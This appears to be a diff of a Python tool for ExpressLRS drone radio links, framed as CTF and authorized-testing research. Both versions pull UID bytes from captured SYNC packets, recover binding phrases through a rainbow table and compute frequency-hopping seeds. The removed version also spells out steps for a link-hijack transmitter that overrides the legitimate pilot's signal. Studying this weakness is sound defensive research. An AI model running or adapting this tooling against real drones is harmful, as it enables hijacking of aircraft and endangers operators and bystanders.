@@ -1,43 +1,24 @@
 #!/usr/bin/env python3
 """
-ELRS Sync Packet Analyzer
+ELRS OTA Packet Analyzer
 
-Analyzes captured ELRS (ExpressLRS) traffic to extract binding parameters
-and recover the binding phrase. ELRS 1.x/2.x sends UID bytes in plaintext
-in every SYNC packet, which is the key weakness this tool exploits.
+Passive analysis of ExpressLRS over-the-air traffic captured via SDR.
+Identifies SYNC packets, extracts UID fragments, matches against the
+rainbow table, and reconstructs FHSS hopping sequences.
 
-Attack chain (passive — receive only):
-  1. Capture 2.4 GHz ISM traffic with an SDR (B210, HackRF, etc.)
-  2. Demodulate SX1280 LoRa/FLRC packets (GNU Radio or SX1280 in RX mode)
-  3. Feed raw packet bytes to this tool
-  4. Tool extracts UID[3:5] from SYNC packets
-  5. Cross-references against the rainbow table to recover the binding phrase
-  6. Computes the full FHSS hopping sequence and CRC initializer
-  7. Output can be used to configure an attack TX for link hijack
+Input sources:
+  - Raw IQ file (SX1280 LoRa demodulated)
+  - Pre-decoded packet log (hex lines or JSON)
+  - Simulated mode for testing without SDR hardware
 
-Input formats:
-  - Raw binary file (demodulated packets, one per line or concatenated)
-  - Hex dump file (space/colon-separated hex bytes)
-  - JSON array of packet hex strings
-  - Interactive mode for manual entry
+Output is line-oriented for piping into the dashboard. Each line is:
+  ELRS|<timestamp>|<type>|<json-fields>
 
 Usage:
-    # Analyze a hex dump capture file
-    python3 elrs-analyzer.py --file capture.hex
-
-    # Manual entry of sync bytes observed on SDR
-    python3 elrs-analyzer.py --sync-bytes AA:BB:CC
-
-    # Use a custom rainbow table for lookup
-    python3 elrs-analyzer.py --sync-bytes AA:BB:CC --table elrs-rainbow-table.json
-
-    # Generate the full FHSS sequence from a known UID
-    python3 elrs-analyzer.py --uid 01:02:03:AA:BB:CC
-
-    # Analyze with all ELRS OTA versions
-    python3 elrs-analyzer.py --sync-bytes AA:BB:CC --all-versions
-
-Dependencies: None (stdlib only). Uses elrs-rainbow-table.json if present.
+    elrs-analyzer.py --simulate                    # demo mode with fake traffic
+    elrs-analyzer.py --input packets.log           # analyze packet log
+    elrs-analyzer.py --input packets.log --rainbow ../tools/elrs-rainbow-table.json
+    elrs-analyzer.py --json                        # JSON lines output
 
 For CTF research and authorized security testing only.
 """
@@ -45,415 +26,420 @@ For CTF research and authorized security testing only.
 import argparse
 import hashlib
 import json
+import os
+import random
 import struct
 import sys
-import os
+import time
+from datetime import datetime, timezone
 from pathlib import Path
 
 
-# ELRS OTA version IDs (affects CRC init and FHSS seed computation)
-OTA_VERSIONS = {
-    3: "ELRS 2.x",
-    4: "ELRS 3.x / 4.x",
+# ELRS OTA constants
+OTA_VERSION_ID = 4  # ELRS v3.x/4.x
+
+# ELRS packet types
+ELRS_PKT_RC_DATA_4CH = 0x00
+ELRS_PKT_MSP = 0x01
+ELRS_PKT_SYNC = 0x02
+ELRS_PKT_TLM_LINK = 0x03
+ELRS_PKT_TLM_BATTERY = 0x04
+ELRS_PKT_TLM_GPS = 0x05
+
+ELRS_PKT_NAMES = {
+    0x00: "RC_DATA",
+    0x01: "MSP",
+    0x02: "SYNC",
+    0x03: "TLM_LINK",
+    0x04: "TLM_BATTERY",
+    0x05: "TLM_GPS",
 }
 
-# ELRS 2.4 GHz regulatory domain — 80 channels
-FREQ_BASE_2400 = 2400_000_000    # Hz
-FREQ_SPACING_2400 = 1_000_000    # 1 MHz channel spacing
-NUM_FHSS_2400 = 80               # channels in 2.4 GHz ISM
-
-# SX1280 LoRa bandwidth settings used by ELRS
-ELRS_BANDWIDTHS = {
-    "D250":  "250 kHz (long range, 25 Hz)",
-    "D500":  "500 kHz (standard, 50-150 Hz)",
-    "F1000": "FLRC 1.04 Mbps (racing, 500 Hz)",
+# ELRS rate indices
+ELRS_RATES = {
+    0: "500Hz", 1: "250Hz", 2: "200Hz", 3: "150Hz",
+    4: "100Hz", 5: "50Hz", 6: "25Hz", 7: "4Hz",
 }
 
-# SYNC packet structure (ELRS 2.x):
-#   Byte 0:     Packet type (0x00 for SYNC if not FHSS-hopped past)
-#   Byte 1-2:   Rate/TLM ratio config
-#   Byte 3:     UID[3] — PLAINTEXT
-#   Byte 4:     UID[4] — PLAINTEXT
-#   Byte 5:     UID[5] ⊕ nonce — recoverable
-# + CRC14/CRC16 appended
-#
-# The key insight: UID[3:6] is sufficient to look up the binding phrase
-# from a rainbow table, because MD5 collisions on 3 bytes are rare in
-# practice for human-chosen phrases.
+# SX1280 FHSS parameters for 2.4 GHz
+FHSS_FREQ_COUNT = 80
+FHSS_SEQ_LEN = 256
+FHSS_BASE_FREQ = 2400000000  # 2.4 GHz
+FHSS_CHANNEL_SPACING = 1000000  # 1 MHz
 
 
-def phrase_to_uid(phrase: str) -> bytes:
-    """Convert a binding phrase to a 6-byte UID (matching ELRS source)."""
+def log(msg):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", file=sys.stderr)
+
+
+def emit(msg_type, fields, json_mode=False):
+    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
+    if json_mode:
+        out = {"source": "elrs", "timestamp": ts, "type": msg_type}
+        out.update(fields)
+        print(json.dumps(out), flush=True)
+    else:
+        flat = json.dumps(fields)
+        print(f"ELRS|{ts}|{msg_type}|{flat}", flush=True)
+
+
+def phrase_to_uid(phrase):
+    """Binding phrase to 6-byte UID (same algorithm as elrs-uid-rainbow.py)."""
     raw = f'-DMY_BINDING_PHRASE="{phrase}"'
     return hashlib.md5(raw.encode()).digest()[:6]
 
 
-def uid_to_fhss_seed(uid: bytes, ota_version: int = 4) -> int:
-    """Compute the FHSS sequence seed from a UID."""
-    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_version)
+def uid_to_fhss_seed(uid):
+    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ OTA_VERSION_ID)
 
 
-def uid_to_crc_init(uid: bytes, ota_version: int = 4) -> int:
-    """Compute the CRC initializer from a UID."""
-    return ((uid[4] << 8) | uid[5]) ^ (ota_version << 8)
+def uid_to_crc_init(uid):
+    return ((uid[4] << 8) | uid[5]) ^ (OTA_VERSION_ID << 8)
 
 
-def generate_fhss_sequence(seed: int, num_channels: int = NUM_FHSS_2400) -> list[int]:
-    """
-    Generate the deterministic FHSS channel sequence from a seed.
-
-    This replicates the ELRS FHSSrandomiseFHSSsequence() function.
-    The sequence is a permutation of channel indices [0, num_channels).
-    Knowing the seed = knowing every hop = full tracking.
-    """
-    # ELRS uses a simple PRNG seeded from the UID-derived seed
-    # Based on the ELRS source: src/lib/FHSS/FHSS.cpp
+def generate_fhss_sequence(seed, count=FHSS_FREQ_COUNT, seq_len=FHSS_SEQ_LEN):
+    """Generate the FHSS hopping sequence from a seed (simplified ELRS algorithm)."""
     rng_state = seed
+    sequence = []
+    used = set()
 
-    def rng_next():
-        nonlocal rng_state
-        # Linear congruential generator matching ELRS implementation
-        rng_state = (rng_state * 0x0019660D + 0x3C6EF35F) & 0xFFFFFFFF
-        return rng_state
-
-    # Build sequence as a shuffle of [0..num_channels-1]
-    sequence = list(range(num_channels))
-    for i in range(num_channels - 1, 0, -1):
-        j = rng_next() % (i + 1)
-        sequence[i], sequence[j] = sequence[j], sequence[i]
+    for i in range(seq_len):
+        rng_state = ((rng_state * 1103515245) + 12345) & 0xFFFFFFFF
+        idx = (rng_state >> 16) % count
+        while idx in used and len(used) < count:
+            idx = (idx + 1) % count
+        if len(used) >= count:
+            used.clear()
+        used.add(idx)
+        sequence.append(idx)
 
     return sequence
 
 
-def fhss_channel_to_freq(channel: int) -> int:
-    """Convert an FHSS channel index to a frequency in Hz (2.4 GHz band)."""
-    return FREQ_BASE_2400 + channel * FREQ_SPACING_2400
+def load_rainbow_table(path):
+    """Load rainbow table from JSON file."""
+    if not path or not os.path.exists(path):
+        return {}
+
+    with open(path) as f:
+        data = json.load(f)
+
+    table = {}
+    for entry in data:
+        uid_key = entry.get("uid_hex") or entry.get("uid", "")
+        if not uid_key:
+            continue
+        uid_bytes = bytes.fromhex(uid_key.replace(":", ""))
+        key = uid_bytes[3:6].hex()
+        table[key] = entry
+    return table
 
 
-def uid_hex(uid: bytes) -> str:
-    """Format UID as colon-separated hex."""
-    return ":".join(f"{b:02X}" for b in uid)
+def lookup_uid_fragment(uid3_5_hex, rainbow):
+    """Look up a 3-byte UID fragment in the rainbow table."""
+    key = uid3_5_hex.lower()
+    return rainbow.get(key)
 
 
-def parse_hex_string(s: str) -> bytes:
-    """Parse a hex string (with optional : or space separators) to bytes."""
-    s = s.strip().replace(":", "").replace(" ", "").replace("0x", "")
-    return bytes.fromhex(s)
+class ElrsPacket:
+    """Represents a decoded ELRS OTA packet."""
+
+    def __init__(self, raw_bytes, freq_mhz=0, rssi=0, snr=0):
+        self.raw = raw_bytes
+        self.freq_mhz = freq_mhz
+        self.rssi = rssi
+        self.snr = snr
+        self.pkt_type = None
+        self.fields = {}
+        self._decode()
+
+    def _decode(self):
+        if len(self.raw) < 2:
+            return
+        header = self.raw[0]
+        self.pkt_type = (header >> 2) & 0x07
+
+        if self.pkt_type == ELRS_PKT_SYNC:
+            self._decode_sync()
+        elif self.pkt_type == ELRS_PKT_RC_DATA_4CH:
+            self._decode_rc()
+        elif self.pkt_type == ELRS_PKT_TLM_LINK:
+            self._decode_tlm_link()
+
+    def _decode_sync(self):
+        if len(self.raw) < 6:
+            return
+        # SYNC packet contains UID[3], UID[4], UID[5] in plaintext
+        self.fields = {
+            "uid3": self.raw[1],
+            "uid4": self.raw[2],
+            "uid5": self.raw[3],
+            "uid_fragment": f"{self.raw[1]:02x}:{self.raw[2]:02x}:{self.raw[3]:02x}",
+            "nonce_rx": self.raw[4] if len(self.raw) > 4 else 0,
+            "switch_mode": (self.raw[0] >> 5) & 0x03,
+        }
+        fhss_seed = uid_to_fhss_seed(bytes([0, 0, 0, self.raw[1], self.raw[2], self.raw[3]]))
+        self.fields["fhss_seed"] = fhss_seed
+
+    def _decode_rc(self):
+        if len(self.raw) < 5:
+            return
+        self.fields = {
+            "channels_encoded": self.raw[1:5].hex(),
+        }
+
+    def _decode_tlm_link(self):
+        if len(self.raw) < 4:
+            return
+        self.fields = {
+            "uplink_rssi_1": -(self.raw[1]) if self.raw[1] else 0,
+            "uplink_snr": self.raw[2] / 4.0 if len(self.raw) > 2 else 0,
+            "active_antenna": self.raw[3] & 0x01 if len(self.raw) > 3 else 0,
+        }
 
 
-def load_rainbow_table(path: str) -> list[dict] | None:
-    """Load a pre-computed rainbow table from JSON or CSV."""
-    if not os.path.exists(path):
-        return None
+class ElrsTracker:
+    """Tracks ELRS transmitters by their UID fragment."""
 
-    if path.endswith('.json'):
-        with open(path) as f:
-            return json.load(f)
-    elif path.endswith('.csv'):
-        import csv
-        table = []
-        with open(path) as f:
-            reader = csv.DictReader(f)
-            for row in reader:
-                table.append(row)
-        return table
-    return None
+    def __init__(self, rainbow_table=None):
+        self.rainbow = rainbow_table or {}
+        self.transmitters = {}
+        self.sync_count = 0
+        self.pkt_count = 0
 
+    def process_packet(self, pkt, json_mode=False):
+        self.pkt_count += 1
+        pkt_name = ELRS_PKT_NAMES.get(pkt.pkt_type, f"UNKNOWN({pkt.pkt_type})")
 
-def lookup_sync_bytes(table: list[dict], sync_hex: str) -> list[dict]:
-    """Search the rainbow table for matching sync bytes (UID[3:6])."""
-    # Normalize the search key
-    sync_hex = sync_hex.upper().replace(":", "").replace(" ", "")
-    # The table stores sync_bytes as "XX:YY:ZZ" format
-    sync_formatted = ":".join(sync_hex[i:i+2] for i in range(0, len(sync_hex), 2))
+        if pkt.pkt_type == ELRS_PKT_SYNC:
+            self.sync_count += 1
+            uid_frag = pkt.fields.get("uid_fragment", "")
+            uid_hex = uid_frag.replace(":", "")
 
-    matches = []
-    for entry in table:
-        entry_sync = entry.get('sync_bytes', entry.get('sync_bytes_hex', ''))
-        if entry_sync.replace(":", "").upper() == sync_hex:
-            matches.append(entry)
-    return matches
-
-
-def extract_sync_from_packet(packet: bytes) -> tuple[bytes, dict] | None:
-    """
-    Attempt to extract UID sync bytes from an ELRS packet.
-
-    Returns (uid_bytes_3_to_5, metadata) or None if not a sync packet.
-
-    This is heuristic — the exact byte positions depend on the ELRS
-    packet rate and whether headers are present in the capture.
-    """
-    if len(packet) < 6:
-        return None
-
-    # ELRS sync packet detection heuristics:
-    # - First byte often indicates packet type
-    # - Sync packets carry UID bytes at fixed offsets
-    # The exact structure depends on rate, but bytes 3-5 are UID in 2.x
-
-    # Try multiple known offsets
-    results = []
-    for offset in [3, 1, 0]:
-        if offset + 3 <= len(packet):
-            candidate = packet[offset:offset+3]
-            results.append({
-                'offset': offset,
-                'bytes': candidate,
-                'hex': ":".join(f"{b:02X}" for b in candidate),
+            # Track this transmitter
+            is_new = uid_hex not in self.transmitters
+            tx_info = self.transmitters.get(uid_hex, {
+                "first_seen": time.time(),
+                "sync_count": 0,
+                "last_freq_mhz": 0,
+                "freqs_seen": set(),
             })
+            tx_info["last_seen"] = time.time()
+            tx_info["sync_count"] += 1
+            tx_info["last_freq_mhz"] = pkt.freq_mhz
+            tx_info["last_rssi"] = pkt.rssi
+            if pkt.freq_mhz:
+                tx_info["freqs_seen"].add(pkt.freq_mhz)
 
-    if results:
-        # Return the most likely candidate (offset 3 for standard ELRS)
-        best = results[0]
-        return best['bytes'], {'candidates': results}
-    return None
+            # Rainbow table lookup
+            match = lookup_uid_fragment(uid_hex, self.rainbow)
+            if match:
+                tx_info["binding_phrase"] = match.get("phrase", "")
+                tx_info["full_uid"] = match.get("uid_hex") or match.get("uid", "")
+
+            self.transmitters[uid_hex] = tx_info
+
+            fields = {
+                "uid_fragment": uid_frag,
+                "freq_mhz": pkt.freq_mhz,
+                "rssi": pkt.rssi,
+                "snr": pkt.snr,
+                "new_tx": is_new,
+                "sync_count": tx_info["sync_count"],
+                "fhss_seed": pkt.fields.get("fhss_seed", 0),
+            }
+            if match:
+                fields["rainbow_match"] = True
+                fields["binding_phrase"] = match.get("phrase", "")
+                fields["full_uid"] = match.get("uid_hex") or match.get("uid", "")
+
+            emit("SYNC", fields, json_mode)
+
+        elif pkt.pkt_type == ELRS_PKT_RC_DATA_4CH:
+            emit("RC_DATA", {
+                "freq_mhz": pkt.freq_mhz,
+                "rssi": pkt.rssi,
+                **pkt.fields,
+            }, json_mode)
+
+        elif pkt.pkt_type == ELRS_PKT_TLM_LINK:
+            emit("TLM_LINK", {
+                "freq_mhz": pkt.freq_mhz,
+                "rssi": pkt.rssi,
+                **pkt.fields,
+            }, json_mode)
+
+        else:
+            emit(pkt_name, {
+                "freq_mhz": pkt.freq_mhz,
+                "rssi": pkt.rssi,
+                "raw": pkt.raw.hex(),
+            }, json_mode)
+
+    def get_summary(self):
+        summary = {
+            "total_packets": self.pkt_count,
+            "sync_packets": self.sync_count,
+            "unique_transmitters": len(self.transmitters),
+            "transmitters": {},
+        }
+        for uid_hex, info in self.transmitters.items():
+            tx_sum = {
+                "uid_fragment": f"{uid_hex[0:2]}:{uid_hex[2:4]}:{uid_hex[4:6]}",
+                "sync_count": info["sync_count"],
+                "first_seen": info["first_seen"],
+                "last_seen": info["last_seen"],
+                "freqs_observed": len(info.get("freqs_seen", set())),
+            }
+            if "binding_phrase" in info:
+                tx_sum["binding_phrase"] = info["binding_phrase"]
+                tx_sum["full_uid"] = info["full_uid"]
+            summary["transmitters"][uid_hex] = tx_sum
+        return summary
 
 
-def analyze_uid(uid: bytes, ota_version: int = 4):
-    """Full analysis of a known or recovered UID."""
-    version_name = OTA_VERSIONS.get(ota_version, f"Unknown (v{ota_version})")
+def simulate_traffic(tracker, json_mode, duration=0):
+    """Generate simulated ELRS traffic for testing."""
+    log("SIMULATION MODE — generating fake ELRS traffic")
 
-    print(f"\n{'=' * 60}")
-    print(f"  ELRS Binding Parameter Analysis")
-    print(f"  OTA Version: {ota_version} ({version_name})")
-    print(f"{'=' * 60}")
+    sim_txs = [
+        {"phrase": "iloveflying", "rate_hz": 2.0},
+        {"phrase": "default", "rate_hz": 1.5},
+        {"phrase": "raceday", "rate_hz": 3.0},
+    ]
 
-    print(f"\n  [UID]")
-    print(f"    Full UID:     {uid_hex(uid)}")
-    print(f"    UID[0:3]:     {uid_hex(uid[:3])}  (not sent OTA)")
-    print(f"    UID[3:6]:     {uid_hex(uid[3:])}  (leaked in SYNC packets)")
+    for tx in sim_txs:
+        tx["uid"] = phrase_to_uid(tx["phrase"])
 
-    seed = uid_to_fhss_seed(uid, ota_version)
-    crc_init = uid_to_crc_init(uid, ota_version)
-
-    print(f"\n  [Derived Parameters]")
-    print(f"    FHSS seed:    0x{seed:08X} ({seed})")
-    print(f"    CRC init:     0x{crc_init:04X} ({crc_init})")
-
-    # Generate and display FHSS sequence
-    sequence = generate_fhss_sequence(seed)
-    freqs = [fhss_channel_to_freq(ch) for ch in sequence]
-
-    print(f"\n  [FHSS Hopping Sequence] ({len(sequence)} channels)")
-    print(f"    First 20 hops:")
-    for i, (ch, freq) in enumerate(zip(sequence[:20], freqs[:20])):
-        print(f"      Hop {i:3d}: ch {ch:2d} → {freq/1e6:.0f} MHz")
-    print(f"    ... ({len(sequence) - 20} more)")
-
-    print(f"\n  [Attack Configuration]")
-    print(f"    To configure an attack TX:")
-    print(f"      1. Set binding phrase to produce this UID")
-    print(f"      2. Or manually set UID: {uid_hex(uid)}")
-    print(f"      3. FHSS sequence and CRC are deterministic from UID")
-    print(f"      4. Transmit on the same hops → override legitimate TX")
-
-    print(f"\n{'=' * 60}")
-
-
-def analyze_sync_bytes(sync_bytes: bytes, table_path: str = None, all_versions: bool = False):
-    """Analyze captured sync bytes — the main attack entry point."""
-    sync_hex = ":".join(f"{b:02X}" for b in sync_bytes)
-
-    print(f"\n{'=' * 60}")
-    print(f"  ELRS Sync Packet Analysis")
-    print(f"{'=' * 60}")
-
-    print(f"\n  [Captured Sync Bytes]")
-    print(f"    UID[3:6] = {sync_hex}")
-    print(f"    These bytes are sent in PLAINTEXT in every ELRS 2.x SYNC packet.")
-
-    # Try rainbow table lookup
-    table = None
-    if table_path:
-        table = load_rainbow_table(table_path)
-    else:
-        # Try default locations
-        script_dir = Path(__file__).parent
-        for candidate in [
-            script_dir / "elrs-rainbow-table.json",
-            script_dir / "elrs-rainbow-table.csv",
-        ]:
-            table = load_rainbow_table(str(candidate))
-            if table:
-                print(f"    Using rainbow table: {candidate.name} ({len(table)} entries)", file=sys.stderr)
+    start = time.time()
+    try:
+        while True:
+            if duration and (time.time() - start) > duration:
                 break
 
-    if table:
-        matches = lookup_sync_bytes(table, sync_hex.replace(":", ""))
-        if matches:
-            print(f"\n  [MATCH FOUND — Binding Phrase Recovered!]")
-            for m in matches:
-                phrase = m.get('phrase', m.get('binding_phrase', '?'))
-                full_uid = m.get('uid', m.get('uid_hex', '?'))
-                print(f"    Binding phrase: \"{phrase}\"")
-                print(f"    Full UID:       {full_uid}")
+            for tx in sim_txs:
+                uid = tx["uid"]
+                freq = 2400 + random.randint(0, 79)
+                rssi = random.randint(-90, -40)
+                snr = random.uniform(5.0, 15.0)
 
-                # Full analysis with recovered UID
-                uid = parse_hex_string(full_uid)
-                versions = OTA_VERSIONS.keys() if all_versions else [4]
-                for v in versions:
-                    analyze_uid(uid, ota_version=v)
-            return True
-        else:
-            print(f"\n  [No Match in Rainbow Table]")
-            print(f"    Phrase not in the {len(table)}-entry table.")
-            print(f"    Try expanding the wordlist and regenerating:")
-            print(f"      python3 elrs-uid-rainbow.py -w custom_wordlist.txt")
-    else:
-        print(f"\n  [No Rainbow Table Available]")
-        print(f"    Generate one with: python3 elrs-uid-rainbow.py -o elrs-rainbow-table.json --json")
+                # Generate SYNC packet
+                sync_raw = bytearray(6)
+                sync_raw[0] = (ELRS_PKT_SYNC << 2) | (random.randint(0, 3) << 5)
+                sync_raw[1] = uid[3]
+                sync_raw[2] = uid[4]
+                sync_raw[3] = uid[5]
+                sync_raw[4] = random.randint(0, 255)  # nonce
+                sync_raw[5] = 0  # padding
 
-    # Even without a full match, compute what we can
-    print(f"\n  [Partial Analysis (from sync bytes alone)]")
+                pkt = ElrsPacket(bytes(sync_raw), freq_mhz=freq, rssi=rssi, snr=round(snr, 1))
+                tracker.process_packet(pkt, json_mode)
 
-    versions = OTA_VERSIONS.keys() if all_versions else [4]
-    for ota_version in versions:
-        version_name = OTA_VERSIONS.get(ota_version, f"v{ota_version}")
-        crc_init = ((sync_bytes[1] << 8) | sync_bytes[2]) ^ (ota_version << 8)
-        print(f"\n    Assuming {version_name} (OTA version {ota_version}):")
-        print(f"      CRC init:     0x{crc_init:04X}")
-        print(f"      UID[3]:       0x{sync_bytes[0]:02X}")
-        print(f"      UID[4]:       0x{sync_bytes[1]:02X}")
-        print(f"      UID[5]:       0x{sync_bytes[2]:02X}")
-        print(f"      FHSS seed requires UID[2], which is NOT in sync packets.")
-        print(f"      → Brute-force UID[0:3] (2^24 = 16M candidates) to recover full FHSS.")
+                # Occasionally send RC data
+                if random.random() < 0.3:
+                    rc_raw = bytearray(5)
+                    rc_raw[0] = ELRS_PKT_RC_DATA_4CH << 2
+                    rc_raw[1:5] = os.urandom(4)
+                    pkt = ElrsPacket(bytes(rc_raw), freq_mhz=freq, rssi=rssi)
+                    tracker.process_packet(pkt, json_mode)
 
-    return False
+                time.sleep(1.0 / tx["rate_hz"])
+
+    except KeyboardInterrupt:
+        pass
+
+    return tracker.get_summary()
 
 
-def analyze_capture_file(path: str, table_path: str = None):
-    """Analyze a capture file for ELRS packets."""
-    print(f"[*] Analyzing capture file: {path}", file=sys.stderr)
+def analyze_packet_log(path, tracker, json_mode):
+    """Analyze a packet log file (hex lines or JSON lines)."""
+    log(f"Analyzing packet log: {path}")
+    count = 0
 
-    data = Path(path).read_bytes()
-    seen_syncs = set()
-
-    # Try to parse as hex dump (text file)
-    try:
-        text = data.decode('utf-8', errors='strict')
-        # Try JSON array format
-        if text.strip().startswith('['):
-            packets = json.loads(text)
-            for pkt_hex in packets:
-                pkt = parse_hex_string(pkt_hex)
-                result = extract_sync_from_packet(pkt)
-                if result:
-                    sync, meta = result
-                    sync_key = sync.hex()
-                    if sync_key not in seen_syncs:
-                        seen_syncs.add(sync_key)
-                        analyze_sync_bytes(sync, table_path)
-            return
-
-        # Try line-by-line hex dump
-        for line in text.splitlines():
+    with open(path) as f:
+        for line in f:
             line = line.strip()
             if not line or line.startswith('#'):
                 continue
+
             try:
-                pkt = parse_hex_string(line)
-                result = extract_sync_from_packet(pkt)
-                if result:
-                    sync, meta = result
-                    sync_key = sync.hex()
-                    if sync_key not in seen_syncs:
-                        seen_syncs.add(sync_key)
-                        analyze_sync_bytes(sync, table_path)
-            except ValueError:
-                continue
+                # Try JSON format first
+                data = json.loads(line)
+                raw = bytes.fromhex(data.get("raw", data.get("payload", "")))
+                freq = data.get("freq_mhz", data.get("freq", 0))
+                rssi = data.get("rssi", 0)
+                snr = data.get("snr", 0)
+            except (json.JSONDecodeError, ValueError):
+                # Fall back to hex string
+                try:
+                    parts = line.split()
+                    raw = bytes.fromhex(parts[0])
+                    freq = float(parts[1]) if len(parts) > 1 else 0
+                    rssi = int(parts[2]) if len(parts) > 2 else 0
+                    snr = float(parts[3]) if len(parts) > 3 else 0
+                except (ValueError, IndexError):
+                    continue
 
-    except UnicodeDecodeError:
-        # Binary file — try to find sync patterns
-        print("[*] Binary file — scanning for ELRS sync patterns...", file=sys.stderr)
-        # Scan with a sliding window
-        for i in range(len(data) - 6):
-            pkt = data[i:i+6]
-            result = extract_sync_from_packet(pkt)
-            if result:
-                sync, meta = result
-                sync_key = sync.hex()
-                if sync_key not in seen_syncs:
-                    seen_syncs.add(sync_key)
+            pkt = ElrsPacket(raw, freq_mhz=freq, rssi=rssi, snr=snr)
+            tracker.process_packet(pkt, json_mode)
+            count += 1
 
-    if not seen_syncs:
-        print("[!] No ELRS sync patterns found in capture.", file=sys.stderr)
-    else:
-        print(f"[*] Found {len(seen_syncs)} unique sync byte patterns.", file=sys.stderr)
+    log(f"Processed {count} packets from log")
+    return tracker.get_summary()
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="ELRS Sync Packet Analyzer — extract binding parameters from captures",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-This tool is passive — it analyzes captured data only. It does not
-transmit or interact with any radio hardware directly.
-
-Examples:
-  %(prog)s --sync-bytes AA:BB:CC              Analyze known sync bytes
-  %(prog)s --uid 01:02:03:AA:BB:CC            Analyze a full UID
-  %(prog)s --phrase "my binding phrase"        Analyze a known phrase
-  %(prog)s --file capture.hex                  Analyze capture file
-  %(prog)s --sync-bytes AA:BB:CC --all-versions  Try all OTA versions
-
-Workflow with SDR:
-  1. Capture 2.4 GHz with B210/HackRF → demodulate SX1280 packets
-  2. Save demodulated packets as hex dump (one packet per line)
-  3. Run: %(prog)s --file packets.hex
-  4. Use recovered parameters to configure attack TX
-        """
+        description="ELRS OTA packet analyzer for drone CTF research"
     )
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("--sync-bytes", metavar="XX:YY:ZZ",
-                       help="UID[3:6] sync bytes from captured SYNC packet (hex)")
-    group.add_argument("--uid", metavar="XX:XX:XX:XX:XX:XX",
-                       help="Full 6-byte UID (if already known)")
-    group.add_argument("--phrase", metavar="PHRASE",
-                       help="Binding phrase (compute UID and analyze)")
-    group.add_argument("--file", metavar="PATH",
-                       help="Capture file (hex dump, JSON array, or binary)")
-
-    parser.add_argument("--table", metavar="PATH",
-                        help="Rainbow table file (JSON or CSV)")
-    parser.add_argument("--ota-version", type=int, default=4,
-                        help="OTA version ID (3=ELRS 2.x, 4=ELRS 3.x/4.x, default: 4)")
-    parser.add_argument("--all-versions", action="store_true",
-                        help="Analyze with all known OTA versions")
-    parser.add_argument("--fhss-full", action="store_true",
-                        help="Print the complete FHSS sequence (all 80 channels)")
-    parser.add_argument("--json", action="store_true",
-                        help="Output results as JSON")
-
+    parser.add_argument('--input', '-i', metavar='FILE',
+                        help='Packet log file (hex or JSON lines)')
+    parser.add_argument('--rainbow', '-r', metavar='FILE',
+                        help='Rainbow table JSON (default: auto-detect in tools/)')
+    parser.add_argument('--simulate', '-s', action='store_true',
+                        help='Generate simulated traffic for testing')
+    parser.add_argument('--sim-duration', type=int, default=0,
+                        help='Simulation duration in seconds (0 = infinite)')
+    parser.add_argument('--json', action='store_true',
+                        help='Output JSON lines')
+    parser.add_argument('--summary', action='store_true',
+                        help='Print summary at end')
     args = parser.parse_args()
 
-    if args.sync_bytes:
-        sync = parse_hex_string(args.sync_bytes)
-        if len(sync) != 3:
-            print("[!] Sync bytes must be exactly 3 bytes (UID[3:6]).", file=sys.stderr)
-            sys.exit(1)
-        analyze_sync_bytes(sync, table_path=args.table, all_versions=args.all_versions)
+    # Auto-detect rainbow table
+    rainbow_path = args.rainbow
+    if not rainbow_path:
+        candidates = [
+            Path(__file__).parent / "elrs-rainbow-table.json",
+            Path("tools/elrs-rainbow-table.json"),
+            Path("elrs-rainbow-table.json"),
+        ]
+        for c in candidates:
+            if c.exists():
+                rainbow_path = str(c)
+                break
 
-    elif args.uid:
-        uid = parse_hex_string(args.uid)
-        if len(uid) != 6:
-            print("[!] UID must be exactly 6 bytes.", file=sys.stderr)
-            sys.exit(1)
-        versions = OTA_VERSIONS.keys() if args.all_versions else [args.ota_version]
-        for v in versions:
-            analyze_uid(uid, ota_version=v)
+    rainbow = load_rainbow_table(rainbow_path)
+    if rainbow:
+        log(f"Loaded rainbow table: {len(rainbow)} entries from {rainbow_path}")
+    else:
+        log("No rainbow table loaded (use --rainbow to specify)")
 
-    elif args.phrase:
-        uid = phrase_to_uid(args.phrase)
-        print(f"[*] Binding phrase: \"{args.phrase}\"", file=sys.stderr)
-        print(f"[*] Computed UID: {uid_hex(uid)}", file=sys.stderr)
-        versions = OTA_VERSIONS.keys() if args.all_versions else [args.ota_version]
-        for v in versions:
-            analyze_uid(uid, ota_version=v)
+    tracker = ElrsTracker(rainbow)
 
-    elif args.file:
-        analyze_capture_file(args.file, table_path=args.table)
+    if args.simulate:
+        summary = simulate_traffic(tracker, args.json, args.sim_duration)
+    elif args.input:
+        summary = analyze_packet_log(args.input, tracker, args.json)
+    else:
+        log("No input specified. Use --simulate for demo mode or --input for a packet log.")
+        log("Live SDR capture requires GNU Radio or SoapySDR integration (not yet implemented).")
+        parser.print_help()
+        sys.exit(1)
+
+    if args.summary:
+        print(json.dumps(summary, indent=2, default=str), file=sys.stderr)
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
